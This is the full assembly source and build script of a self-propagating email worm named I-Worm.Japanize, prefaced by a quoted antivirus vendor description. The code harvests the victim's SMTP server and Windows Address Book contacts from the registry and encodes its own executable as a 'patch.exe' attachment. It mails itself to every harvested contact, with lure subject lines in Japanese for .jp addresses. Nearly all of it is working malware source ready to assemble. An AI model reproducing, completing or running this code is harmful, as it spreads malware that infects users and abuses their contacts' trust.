;;;  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
;;;                         I-Worm.Japanize
;;;  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
;;;
;;;  
;;;  This has some bugs.
;;;
;;; Here TrendMicro description:
;;;  ******************************************************************
;;;  http://www.antivirus.com/vinfo/virusencyclo/default5.asp?VName=WORM_FBOUND.B&VSect=T
;;;  Details:
;;;The details of the email this worm arrives with may be as follows:
;;;
;;;To: <recipient> 
;;;Subject: <"Important" or random Japanese text(applicable on Japanese supported platforms)>
;;;Message Body: <blank>
;;;Attachment: patch.exe 
;;;
;;;It uses its own SMTP engine and uses the following registry key to retrieve the default SMTP server of the infected system: 
;;;HKEY_CURRENT_USER\Software\Microsoft\
;;;Internet Account Manager\Accounts\00000001
;;;
;;;It uses the following registry key to retrieve email addresses from the infected user's Windows Address Book (WAB):
;;;HKEY_CURRENT_USER\Software\Microsoft\WAB\
;;;WAB4Wab File Name = Åg<pathname of WAB file>Åh
;;;
;;;The email arrives with the attachment PATCH.EXE. If the email address of its target ;;;user ends with the extension .jp, the worm randomly selects a phrase, from a list of 17 possible Japanese phrases below, and uses one as the subject of the email: 
;;;
;;;
;;;The English translation for the above Japanese text are as follows: 
;;;Re: the issue that you mentioned
;;;Re: important
;;;Re: long time no see
;;;Re: top secret
;;;Re: Hello
;;;Re: important information
;;;Re: data
;;;the issue that you mentioned
;;;important
;;;long time no see
;;;top secret
;;;hello
;;;important information
;;;data
;;;frog
;;;shit
;;;shit
;;;
;;;Otherwise, it uses the subject ÅgImportant."
;;;
;;;This non-destructive worm does not drop files or create any registry entries. Its propagation depends on the execution of the file attachment in the email. 
;;;
;;;The following text strings are found in the worm body:
;;;
;;;ÅeXXXXXXXXXXXXXXXXXXXXXXXÅf
;;;ÅeXXXXX I-Worm.Japanize XXXXXÅf
;;;ÅeXXXXXXXXXXXXXXXXXXXXXXXÅf 
;;;
;;;  
	
	.586p
	.model flat
	locals
	jumps

	
;;;  some lazy shit
callW  macro	@@@x
	extrn	@@@x:proc
	call	@@@x
endm

ofs equ offset

dwo equ dword ptr
wo equ word ptr
by equ byte ptr

HKEY_CURRENT_USER	EQU	80000001h
CRLF		equ 	<13,10>
rdtsc	equ	<dw 310fh>
AF_INET		equ	2
SOCK_STREAM	equ	1

FILE_ATTRIBUTE_NORMAL	EQU	00000080h
GENERIC_READ		EQU	80000000h
GENERIC_WRITE		EQU	40000000h
PAGE_READONLY		EQU	00000002h
PAGE_READWRITE		EQU	00000004h
FILE_MAP_READ		EQU	00000004h
OPEN_EXISTING		EQU	00000003h
GHND			EQU	042h
FILE_SHARE_READ		EQU	00000001h
FILE_SHARE_WRITE	EQU	00000002h
 

;;;  ----------------------------------------------------------------
	.data
hReg				dd	?;  registry handle
str_SMInternetAccountManager	db	'Software\Microsoft\Internet Account Manager',0
str_SMIAccounts			db	'Software\Microsoft\Internet Account Manager\Accounts\'
AccountIdx			db	9 dup(?);  account index
bufsiz_accountidx		dd	9;  size
	
str_DMA				db	'Default Mail Account',0
str_SMTPNAME			db	'SMTP Server',0
str_SMTPEmailAddr		db	'SMTP Email Address',0
str_SMWab4			db	'Software\Microsoft\WAB\WAB4\Wab File Name',0


SMTP_Server			db	50 dup(?)	;  default smtp server
bufsiz_SMTPSERVER		dd	50
morons_Mailaddr			db	256 dup(?)	;  mail address of moron :)
bufsiz_morons_mailaddr		dd	256
wab4_path			db	260 dup(?);  wab file path
bufsiz_wab4_path		dd	260

buffer	db	1000 dup(?)

hwab4file	dd	?		;  wab4 file handle
hwab4map	dd	?		;  
hwab4mapview	dd	?		;  

myfilename	db	260 dup(?)	;  handle of myself
hmyfile		dd	?
fsize		dd	?		;  file size

hmemout0	dd	?
ptr_myself	dd	?
hmemout		dd	?		;  globalalloc
ptr_base64buf	dd	?		;  globallock

target_mailaddr	db	48h dup(?)	;  

sockaddr_in	label byte		;
	sin_family	dw	?
	sin_port	dw	?
	sin_addr	dd	?
	sin_zero	db	8 dup(?)
len_sockaddr_in	=	$ - ofs sockaddr_in

sock	dd	?			;  socket descriptor

recv_buffer	db	1024	dup(?)	;  recv buffer

jflag		dd	0		;  japanese or not

smtp_HELO	db	'HELO localhost',CRLF
len_smtp_HELO	=	$ - ofs smtp_HELO
smtp_MAIL_FROM	db	'MAIL FROM: '
len_smtp_MAIL_FROM	=	$ - ofs smtp_MAIL_FROM
;crlf
smtp_RCPT_TO	db	'RCPT TO: '
len_smtp_RCPT_TO	=	$ - ofs smtp_RCPT_TO
;crlf
smtp_DATA	db	'DATA',CRLF
len_smtp_DATA	=	$ - ofs smtp_DATA
smtp_BODY_FROM	db	'FROM: '
len_smtp_BODY_FROM	=	$ - ofs smtp_BODY_FROM
smtp_BODY_TO	db	CRLF,'TO: '
len_smtp_BODY_TO	=	$ - ofs smtp_BODY_TO
smtp_BODY_SUBJECT	db	CRLF,'SUBJECT: Important',CRLF
len_smtp_BODY_SUBJECT	=	$ - ofs smtp_BODY_SUBJECT

smtp_DOT_CRLF	db	'.',CRLF
len_smtp_DOT_CRLF	=	$ - ofs smtp_DOT_CRLF
smtp_QUIT	db	'QUIT',CRLF
len_smtp_QUIT	=	$ - ofs smtp_QUIT

smtp_crlf	db	CRLF

smtp_MIME_h	db	'MIME-Version: 1.0',CRLF
	db	'Content-Type: multipart/mixed; boundary="Boundary-a8dfidaoRadvfuck"',CRLF
	db	CRLF
	db	'--Boundary-a8dfidaoRadvfuck',CRLF
	db	'Content-Type: text/plain; charset=iso-2022-jp',CRLF
	db	'Content-Transfer-Encoding: 7bit',CRLF
	db	'Content-Description: Mail message body',CRLF
	db	CRLF
	db	CRLF			;  text
	db	CRLF
	db	'--Boundary-a8dfidaoRadvfuck',CRLF
	db	'Content-Type: application/x-msdownload; name="patch.exe"',CRLF
	db	'Content-Disposition: attachment;  filename="patch.exe"',CRLF
	db	'Content-Transfer-Encoding: BASE64',CRLF
	db	CRLF
len_smtp_MIME_h	=	$ - ofs smtp_MIME_h
	;;  base64 body
smtp_MIME_e	db	CRLF,'--Boundary-a8dfidaoRadvfuck--',CRLF,CRLF
len_smtp_MIME_e	=	$ - ofs smtp_MIME_e

r_seed		dd	10987293h	;  random seed


smtp_jsubject_1	db	CRLF,'SUBJECT: =?ISO-2022-JP?B?'
len_smtp_jsubject_1	=	$ - ofs smtp_jsubject_1
smtp_jsubject_2	db	'?=',CRLF
len_smtp_jsubject_2	=	$ - ofs smtp_jsubject_2


;;;  japanese subjects table
japanese_subjects	label	byte
	dd	ofs js_01
	dd	ofs js_02
	dd	ofs js_03
	dd	ofs js_04
	dd	ofs js_05
	dd	ofs js_06
	dd	ofs js_07
	dd	ofs js_08
	dd	ofs js_09
	dd	ofs js_10
	dd	ofs js_11
	dd	ofs js_12
	dd	ofs js_13
	dd	ofs js_14
	dd	ofs js_15
	dd	ofs js_16
	dd	ofs js_17
num_of_jsub	=	($ - ofs japanese_subjects)/4
js_01	db	'GyRCPUVNVxsoQg==',0	;  èdóv
js_02	db	'UmU6GyRCPUVNVxsoQg==',0;  Re:èdóv
js_03	db	'GyRCPUVNVyRKJCpDTiRpJDsbKEI=',0;  èdóvÇ»Ç®ímÇÁÇπ
js_04	db	'UmU6GyRCPUVNVyRKJCpDTiRpJDsbKEI=',0;  Re:èdóvÇ»Ç®ÇµÇÁÇπ
js_05	db	'GyRCTmMkTjdvGyhC',0	;  ó·ÇÃåè
js_06	db	'UmU6GyRCTmMkTjdvGyhC',0;  Re:ó·ÇÃåè
js_07	db	'GyRCJCo1VyQ3JFYkaiRHJDkbKEI=',0;  Ç®ãvÇµÇ‘ÇËÇ≈Ç∑
js_08	db	'UmU6GyRCJCo1VyQ3JFYkaiRHJDkbKEI=',0;  Re:Ç®ãvÇµÇ‘ÇËÇ≈Ç∑
js_09	db	'GyRCJDMkcyRLJEEkTxsoQg==',0;  Ç±ÇÒÇ…ÇøÇÕ
js_10	db	'UmU6GyRCJDMkcyRLJEEkTxsoQg==',0;  Re:Ç±ÇÒÇ…ÇøÇÕ
js_11	db	'GyRCNktIaxsoQg==',0	;  ã…îÈ
js_12	db	'UmU6GyRCNktIaxsoQg==',0;  Re:ã…îÈ
js_13	db	'GyRCO3FOQRsoQg==',0	;  éëóø
js_14	db	'UmU6GyRCO3FOQRsoQg==',0;  Re:éëóø
js_15	db	'GyRCMz8bKEI=',0	;  ≥ø∫
js_16	db	'GyRCJSYlYxsoQlI=',0	;  ÉEÉ\ÉR
js_17	db	'GyRCJCYkcyQzGyhC',0	;  Ç§ÇÒÇ±
	
	.code
start:
	callW	GetTickCount
	mov	dwo [r_seed],eax
	jmp	@@go
	;;  signature :)
	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXX',0
	db	'XXXXX I-Worm.Japanize XXXXX',0
	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXX',0
	@@go:
	call	get_some_info

	push	ofs buffer
	push	0101h
	callW	WSAStartup
	test	eax,eax
	jnz	exit

	call	open_wab
	test	eax,eax
	jnz	clean_sock

	call	create_base64enc
	
	call	spread

free_mem:
	push	dwo [ptr_base64buf]
	callW	GlobalUnlock
	push	dwo [hmemout]
	callW	GlobalFree
	
close_wab4:
	push	dwo [hwab4file]
	push	dwo [hwab4map]
	push	dwo [hwab4mapview]
	callW	CloseHandle
	callW	CloseHandle
	callW	CloseHandle
	
clean_sock:
	callW	WSACleanup
	
exit:
	push	0
	callW	ExitProcess

	
	
spread:
	;;  lifewire ;)
	mov	esi,dwo [hwab4mapview]
	mov	ecx,[esi+64h]		;  num of addr
	jecxz	@@exit
	add	esi,[esi+60h]		;  ptr to addr

	@@spread_loop:
	push	ecx

	mov	eax,esi
	cmp	by [esi+1],0
	jne	@@nounicode
	push	esi
	lea	edi,target_mailaddr
	push	edi

	push	48h
	pop	ecx
	@@1:
	lodsw
	stosb
	loop	@@1

	pop	eax
	pop	esi
	add	esi,20h

	@@nounicode:
	call	spread2

	add	esi,24h
	pop	ecx
	loop	@@spread_loop
	
	@@exit:
	ret
	
	
spread2:
	push	esi
	mov	esi,eax			;  now esi=email addr
	
	push	0
	push	1
	push	2
	callW	socket
	mov	dwo [sock],eax

	mov	wo [sin_family],AF_INET
	mov	ax,25
	xchg	al,ah
	mov	wo [sin_port],ax

	push	ofs SMTP_Server
	callW	gethostbyname
	test	eax,eax
	jz	@@exit

	mov	eax,[eax+12]
	mov	eax,[eax]
	mov	eax,[eax]

	mov	dwo [sin_addr],eax
	push	len_sockaddr_in
	lea	eax,sockaddr_in
	push	eax
	push	dwo [sock]
	callW	connect
	test	eax,eax
	jnz	@@exit

	call	sendmail
	
	@@exit:
	pop	esi
	ret
	
	
;;;  ---
;;;  reg stuff
get_some_info:
	xor	ebx,ebx

	push	ofs hReg
	push	1
	push	ebx
	push	ofs str_SMInternetAccountManager
	push	HKEY_CURRENT_USER
	callW	RegOpenKeyExA
	test	eax,eax
	jnz	@@error

	push	ofs bufsiz_accountidx
	push	ofs AccountIdx
	push	ebx
	push	ebx
	push	ofs str_DMA
	push	dwo [hReg]
	callW	RegQueryValueExA
	test	eax,eax
	jnz	@@error

	push	dwo [hReg]
	callW	RegCloseKey

	push	ofs hReg
	push	1
	push	ebx
	push	ofs str_SMIAccounts
	push	HKEY_CURRENT_USER
	callW	RegOpenKeyExA
	test	eax,eax
	jnz	@@error

	push	ofs bufsiz_SMTPSERVER
	push	ofs SMTP_Server
	push	ebx
	push	ebx
	push	ofs str_SMTPNAME
	push	dwo [hReg]
	callW	RegQueryValueExA
	test	eax,eax
	jnz	@@error

	push	ofs bufsiz_morons_mailaddr
	push	ofs morons_Mailaddr
	push	ebx
	push	ebx
	push	ofs str_SMTPEmailAddr
	push	dwo [hReg]
	callW	RegQueryValueExA
	test	eax,eax
	jnz	@@error

	push	dwo [hReg]
	callW	RegCloseKey

	push	ofs hReg
	push	1
	push	ebx
	push	ofs str_SMWab4
	push	HKEY_CURRENT_USER
	callW	RegOpenKeyExA
	test	eax,eax
	jnz	@@error

	push	ofs bufsiz_wab4_path
	push	ofs wab4_path
	push	ebx
	push	ebx
	push	ebx
	push	dwo [hReg]
	callW	RegQueryValueExA
	test	eax,eax
	jnz	@@error

	push	dwo [hReg]
	callW	RegCloseKey
	xor	eax,eax
	ret
	@@error:
	xor	eax,eax
	dec	eax
	ret

	
open_wab:
	xor	ebx,ebx
	push	ebx
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	ebx
	push	FILE_SHARE_WRITE
	push	GENERIC_READ
	push	ofs wab4_path
	callW	CreateFileA
	inc	eax
	jz	@@error
	dec	eax
	mov	dwo [hwab4file],eax

	push	ebx
	push	ebx
	push	ebx
	push	PAGE_READONLY
	push	ebx
	push	eax
	callW	CreateFileMappingA
	mov	dwo [hwab4map],eax

	push	ebx
	push	ebx
	push	ebx
	push	FILE_MAP_READ
	push	eax
	callW	MapViewOfFile
	mov	dwo [hwab4mapview],eax
	xor	eax,eax
	ret
	@@error:
	xor	eax,eax
	dec	eax
	ret

create_base64enc:
	push	260
	push	ofs myfilename
	push	0
	callW	GetModuleFileNameA

	xor	ebx,ebx
	push	ebx
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	ebx
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	ofs myfilename
	callW	CreateFileA
	inc	eax
	jz	@@error
	dec	eax
	mov	dwo [hmyfile],eax

	push	0
	push	dwo [hmyfile]
	callW	GetFileSize
	mov	dwo [fsize],eax

	add	eax,100h
	push	eax
	push	GHND
	callW	GlobalAlloc
	mov	dwo [hmemout0],eax

	push	eax
	callW	GlobalLock
	mov	dwo [ptr_myself],eax

	push	0
	push	ofs recv_buffer
	push	dwo [fsize]
	push	eax
	push	dwo [hmyfile]
	callW	ReadFile
	test	eax,eax
	jz	@@eexit
	
	push	0
	push	dwo [hmyfile]
	callW	GetFileSize
	push	eax			;  save size

	shl	eax,1			;  eax*2
	
	push	eax
	push	GHND
	callW	GlobalAlloc
	mov	dwo [hmemout],eax

	push	eax
	callW	GlobalLock
	mov	dwo [ptr_base64buf],eax

;	pop	ebx			;  restore size
;	push	ebx			;  size
	push	eax
	push	dwo [ptr_myself]
	call	base64encode


	push	dwo [hmyfile]
	callW	CloseHandle

	push	dwo [ptr_myself]
	callW	GlobalUnlock
	push	dwo [hmemout0]
	callW	GlobalFree
	
	xor	eax,eax
	ret

	@@eexit:
	push	dwo [hmyfile]
	callW	CloseHandle

	push	dwo [ptr_myself]
	callW	GlobalUnlock
	push	dwo [hmemout0]
	callW	GlobalFree

	@@error:
	xor	eax,eax
	dec	eax
	ret
	
base64encode	proc pascal
	arg	@@src
	arg	@@dest
	arg	@@srclen

	mov	esi,dwo [@@src]
	mov	edi,dwo [@@dest]

	@@b64loop:
	xor	eax,eax
	cmp	dwo [@@srclen],1
	jne	@@srclen2
	lodsb
	push	2
	pop	ecx
	mov	edx,03D3Dh		;  ==
	dec	dwo [@@srclen]
	jmp	@@b64next

	@@srclen2:
	cmp	dwo [@@srclen],2
	jne	@@srclen3
	lodsw
	push	3
	pop	ecx
	push	03dh
	pop	edx
	sub	dwo [@@srclen],2
	jmp	@@b64next
	@@srclen3:
	lodsd
	push	4
	pop	ecx
	xor	edx,edx
	dec	esi
	sub	dwo [@@srclen],3

	@@b64next:
	bswap	eax
	
	@@b64n_loop:
	mov	ebx,eax
	and	eax,0FC000000h
	rol	eax,6
	mov	al,[@@b64table + eax]
	stosb
	mov	eax,ebx
	shl	eax,6
	dec	ecx
	jnz	@@b64n_loop

	cmp	dwo [@@srclen],0
	ja	@@b64loop

	mov	eax,edx
	stosd
	ret

	@@b64table	db	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	endp
	
	
g_send:
	;;  in
	;;   ecx = size
	;;   esi = ptr to data
	;;  out
	;;   eax = ret value of send()
	push	0
	push	ecx
	push	esi
	push	dwo [sock]
	callW	send
	ret
	
g_recv:
	;;  out
	;;   error -> eax=-1  success -> eax = 0
	@@again:
	push	0
	push	1024
	push	ofs recv_buffer
	push	dwo [sock]
	callW	recv
	inc	eax
	jz	@@recv_error
	cmp	eax,1024
	jz	@@again
	xor	eax,eax
	ret
	@@recv_error:
	xor	eax,eax
	dec	eax
	ret

	
sendmail:
	;;  yea. lame routine ;)
	push	esi			;  mail addr
	mov	dwo [jflag],0		;  flag for .jp
	;;  
	call	g_recv

	;;  
	lea	esi,smtp_HELO
	mov	ecx,len_smtp_HELO
	call	g_send

	call	g_recv

	;;  
	lea	esi,smtp_MAIL_FROM
	mov	ecx,len_smtp_MAIL_FROM
	call	g_send

	push	ofs morons_Mailaddr
	callW	lstrlen
	mov	ecx,eax
	lea	esi,morons_Mailaddr
	call	g_send
	mov	ecx,2
	lea	esi,smtp_crlf
	call	g_send

	call	g_recv
	;;  
	mov	ecx,len_smtp_RCPT_TO
	lea	esi,smtp_RCPT_TO
	call	g_send

	pop	esi
	push	esi

	push	esi
	callW	lstrlen
	push	eax			;  save
	mov	ecx,eax
	call	g_send
	
	mov	ecx,2
	lea	esi,smtp_crlf
	call	g_send

	call	g_recv

	;;  .jp?
	pop	eax			;  len of mail address
	pop	esi
	push	esi			;  mail address
	add	esi,eax
	sub	esi,3
	cmp	dwo [esi],00706a2eh	;  .jp?
	jne	@@1
	inc	dwo [jflag]
	@@1:
	;;

	lea	esi,smtp_DATA
	mov	ecx,len_smtp_DATA
	call	g_send

	call	g_recv
	;;

	lea	esi,smtp_BODY_FROM
	mov	ecx,len_smtp_BODY_FROM
	call	g_send

	push	ofs morons_Mailaddr
	callW	lstrlen
	mov	ecx,eax
	lea	esi,morons_Mailaddr
	call	g_send

	lea	esi,smtp_BODY_TO
	mov	ecx,len_smtp_BODY_TO
	call	g_send

	pop	esi
	push	esi
	
	push	esi
	callW	lstrlen
	mov	ecx,eax
	call	g_send

	cmp	dwo [jflag],0
	jnz	@@jsubject
	
	mov	ecx,len_smtp_BODY_SUBJECT
	lea	esi,smtp_BODY_SUBJECT
	call	g_send
	jmp	@@body

	@@jsubject:
	;;  gen subject
	mov	ecx,len_smtp_jsubject_1
	lea	esi,smtp_jsubject_1
	call	g_send

	mov	esi,(num_of_jsub-1)
	call	rng
	lea	esi,japanese_subjects
	mov	esi,dwo [esi+eax*4]
	push	esi
	callW	lstrlen
	mov	ecx,eax
	call	g_send

	mov	ecx,len_smtp_jsubject_2
	lea	esi,smtp_jsubject_2
	call	g_send



	@@body:
	lea	esi,smtp_MIME_h
	mov	ecx,len_smtp_MIME_h
	call	g_send

	mov	esi,dwo [ptr_base64buf]
	push	esi
	push	esi
	callW	lstrlen
	pop	esi
	mov	ecx,eax
	call	g_send

	lea	esi,smtp_MIME_e
	mov	ecx,len_smtp_MIME_e
	call	g_send
	
	
	mov	ecx,len_smtp_DOT_CRLF
	lea	esi,smtp_DOT_CRLF
	call	g_send

	call	g_recv
	;;

	mov	ecx,len_smtp_QUIT
	lea	esi,smtp_QUIT
	call	g_send

	call	g_recv
	pop	esi
	
	ret

	
rng:
	;;  in
	;;   esi = range
	;;  out
	;;   eax = random number
	rdtsc
	xor	eax,edx
	imul	eax,dwo [r_seed]
	dec	eax
	mov	dwo [r_seed],eax
	xor	edx,edx
	div	esi
	mov	eax,edx
	ret

end	start

*************************************************************************

@ECHO OFF
TASM32 /ml /m /z japanize.asm,japanize.obj
TLINK32 -x -aa -Tpe japanize.obj,,,%import32.lib
DEL *.OBJ
